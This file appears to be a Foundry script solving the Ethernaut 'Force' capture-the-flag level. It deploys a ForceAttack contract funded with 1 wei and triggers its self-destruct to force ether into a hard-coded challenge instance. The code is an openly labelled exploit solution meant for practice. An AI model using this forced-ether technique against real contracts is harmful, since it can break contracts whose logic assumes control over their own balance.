// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/ForceAttack.sol";

contract ForceAttackScript is Script {
    function run() external {
        // Lấy private key từ file cấu hình .env
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        // ĐỔI ĐỊA CHỈ NÀY: Dán địa chỉ Instance bài Force lấy từ Console Ethernaut của bạn vào đây
        address payable forceInstance = payable(
            0xc4BBBF0f730A1A86B101711b41C8F48c0C94284b
        );

        vm.startBroadcast(deployerPrivateKey);

        // Deploy hợp đồng kèm nạp thẳng 1 wei (hoặc nhiều hơn nếu bạn muốn)
        ForceAttack attacker = new ForceAttack{value: 1 wei}();

        // Kích hoạt tự hủy để ép tiền sang Force instance
        attacker.attack(forceInstance);

        vm.stopBroadcast();
    }
}
